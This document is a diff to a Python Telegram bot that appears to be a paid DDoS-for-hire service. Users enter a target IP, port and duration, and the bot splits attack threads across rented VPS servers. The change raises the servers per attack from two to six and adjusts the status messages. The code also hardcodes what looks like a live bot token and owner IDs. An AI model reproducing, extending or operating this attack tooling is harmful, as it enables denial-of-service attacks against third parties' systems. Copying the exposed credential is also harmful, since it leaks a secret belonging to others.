@@ -65,7 +65,7 @@ current_images = START_IMAGES  # Then use it here
 IMAGE_CONFIG_FILE = "image_config.json"
 OFFICIAL_GROUP_NAME = ""  # Default official group name
 
-TELEGRAM_BOT_TOKEN = '7966875439:AAFwswmJL1Mz7ANKOBASNz-c2AkDVJEiB5I'
+TELEGRAM_BOT_TOKEN = '7518044545:AAEWkQKQvzzDvxSBBqNWd9PonODM6TitQVU'
 OWNER_USERNAME = "Rajaraj909"
 CO_OWNERS = [7086729173, 5968988297]  # List of user IDs for co-owners
 OWNER_CONTACT = "Contact to buy keys"
@@ -2132,27 +2132,26 @@ async def attack_input(update: Update, context: CallbackContext):
         )
         return ConversationHandler.END
 
-    ip, port, duration = args
+    ip, port, duration = args  # Only 3 variables
     duration = int(duration)
     
     # Check busy VPS and available VPS
     busy_vps = [attack['vps_ip'] for attack in running_attacks.values() if 'vps_ip' in attack]
     available_vps = [vps for vps in VPS_LIST[:ACTIVE_VPS_COUNT] if vps[0] not in busy_vps]
     
-    # We need exactly 2 VPS for each attack
-    if len(available_vps) < 2:
+    # We need exactly 6 VPS for the attack now
+    required_vps = 6
+    if len(available_vps) < required_vps:
         current_display_name = get_display_name(update.effective_chat.id if update.effective_chat.type in ['group', 'supergroup'] else None)
         await update.message.reply_text(
-            "❌ *Not enough servers available! Need 2 free VPS.*\n"
-            f"Currently available: {len(available_vps)} VPS\n"
-            f"Please try again later.\n\n"
+            "❌ *All servers are busy! Try again later.*\n\n"
             f"👑 *Bot Owner:* {current_display_name}",
             parse_mode='Markdown'
         )
         return ConversationHandler.END
 
-    # Select exactly 2 VPS
-    selected_vps = available_vps[:2]
+    # Take first 6 available VPS
+    selected_vps = available_vps[:required_vps]
     
     # Set default threads
     user_id = update.effective_user.id
@@ -2187,22 +2186,22 @@ async def attack_input(update: Update, context: CallbackContext):
 
     last_attack_time = time.time()
     
-    # Split threads equally between 2 VPS
-    threads_per_vps = threads // 2
-    remaining_threads = threads % 2
+    # Calculate threads per VPS (6 VPS now)
+    threads_per_vps = threads // required_vps
+    remaining_threads = threads % required_vps
     
     attack_id = f"{ip}:{port}-{time.time()}"
     
     attack_type = "⚡ *SPECIAL ATTACK* ⚡" if is_special else "⚔️ *Attack Started!*"
     current_display_name = get_display_name(update.effective_chat.id if update.effective_chat.type in ['group', 'supergroup'] else None)
     
-    # Send attack started message with actual VPS count being used
+    # Send attack started message
     start_message = await update.message.reply_text(
         f"{attack_type}\n"
         f"🎯 *Target*: {ip}:{port}\n"
         f"🕒 *Duration*: {duration} sec\n"
         f"🧵 *Total Power*: {threads} threads\n"
-        f"🖥️ *Using*: 2 Squid Proxy Servers\n"
+        f"🖥️ *Using*: 6 Powerful Servers\n"
         f"👑 *Bot Owner:* {current_display_name}\n\n"
         f"🔥 *ATTACK STARTED! /running * 💥",
         parse_mode='Markdown'
@@ -2262,33 +2261,22 @@ async def attack_input(update: Update, context: CallbackContext):
             active_attacks = [aid for aid in running_attacks if aid.startswith(attack_id)]
             if not active_attacks:
                 # All attacks finished for this target
-                # Add 5-second countdown before sending finished notification
-                def send_finished_notification():
-                    # Sleep for 5 seconds before sending notification
-                    time.sleep(5)
-                    asyncio.run_coroutine_threadsafe(
-                        context.bot.send_message(
-                            chat_id=update.effective_chat.id,
-                            text=f"✅ *Attack Finished!*\n"
-                                 f"🎯 *Target*: {ip}:{port}\n"
-                                 f"🕒 *Duration*: {duration} sec\n"
-                                 f"🧵 *Total Power*: {threads} threads\n"
-                                 f"🖥️ *Used*: 2 Servers\n"
-                                 f"👑 *Bot Owner:* {current_display_name}\n\n"
-                                 f"🔥 *ATTACK COMPLETED!*",
-                            parse_mode='Markdown'
-                        ),
-                        context.bot.application.event_loop
-                    )
-                
-                # Start the countdown in a separate thread
-                threading.Thread(
-                    target=send_finished_notification,
-                    daemon=True
-                ).start()
+                asyncio.run_coroutine_threadsafe(
+                    context.bot.send_message(
+                        chat_id=update.effective_chat.id,
+                        text=f"✅ *Attack Finished!*\n"
+                             f"🎯 *Target*: {ip}:{port}\n"
+                             f"🕒 *Duration*: {duration} sec\n"
+                             f"🧵 *Total Power*: {threads} threads\n"
+                             f"👑 *Bot Owner:* {current_display_name}\n\n"
+                             f"🔥 *ATTACK COMPLETED!*",
+                        parse_mode='Markdown'
+                    ),
+                    context.bot.application.event_loop
+                )
 
     try:
-        # Start a thread for each selected VPS (exactly 2 VPS)
+        # Start a thread for each selected VPS (6 VPS now)
         for i, vps in enumerate(selected_vps):
             threads_for_vps = threads_per_vps + (1 if i < remaining_threads else 0)
             if threads_for_vps > 0:
